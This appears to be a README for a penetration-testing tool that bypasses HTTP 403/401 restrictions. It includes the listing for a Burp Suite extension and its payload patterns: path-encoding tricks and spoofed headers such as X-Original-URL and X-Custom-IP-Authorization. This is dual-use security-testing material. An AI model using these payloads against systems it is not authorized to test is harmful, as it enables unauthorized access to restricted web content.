

```
                ______                            _____
                | ___ \                          /  ___|
                | |_/ /_   _ _ __   __ _ ___ ___ \ `--. _   _ _ __   ___ _ __
                | ___ \ | | | '_ \ / _` / __/ __| `--. \ | | | '_ \ / _ \ '__|
                | |_/ / |_| | |_) | (_| \__ \__ \/\__/ / |_| | |_) |  __/ |
                \____/ \__, | .__/ \__,_|___/___/\____/ \__,_| .__/ \___|_|
                        __/ | |                              | |
                       |___/|_|                              |_|
                    author: summersec
                    version: 1.0
                    Github: https://github.com/SummerSec/BypassSuper
````
# 添加自己的规则

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201203214401315.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201203214306848.png)

https://twitter.com/infosecsanyam/status/1331146922011324417

https://twitter.com/i_hack_everyone/status/1332027600726753280

https://github.com/lobuhi/byp4xx/blob/main/byp4xx.sh#L70

https://twitter.com/jae_hak99/status/1333811754745249792

https://twitter.com/h4x0r_dz/status/1317218511937261570

https://github.com/KathanP19/HowToHunt/blob/master/WAF_Bypasses/WAF_Bypass_Using_headers.md



## GitHub

项目地址：https://github.com/SummerSec/Bypass403or401

---



# 403Bypasser

An burpsuite extension to bypass 403 restricted directory. By using PassiveScan (default enabled), each 403 request will be **automatically** scanned by this extension, so just add to burpsuite and enjoy.

Payloads: 
$1: HOSTNAME
$2: PATH
```
$1/$2
$1/%2e/$2
$1/$2/.
$1//$2//
$1/./$2/./
$1/$2 -H "X-Original-URL: /$2" 
$1/$2 -H "X-Custom-IP-Authorization: 127.0.0.1" 
$1/$2 -H "X-Rewrite-URL: /$2"
$1/$2%20/
$1/%20$2%20/

$1/$2..;/
```

## Installation

`BurpSuite -> Extender -> Extensions -> Add -> Extension Type: Python -> Select file: 403bypasser.py -> Next till Fininsh`

## Screenshot
<img src="ScreenShot.png" width="450"/>

## References:
* [https://twitter.com/iam_j0ker/status/1324354024657711106?s=20](https://twitter.com/iam_j0ker/status/1324354024657711106?s=20)
* [https://twitter.com/jae_hak99/status/1297556269960540161?s=20](https://twitter.com/jae_hak99/status/1297556269960540161?s=20)
* [https://twitter.com/SalahHasoneh1/status/1296572143141031945](https://twitter.com/SalahHasoneh1/status/1296572143141031945)
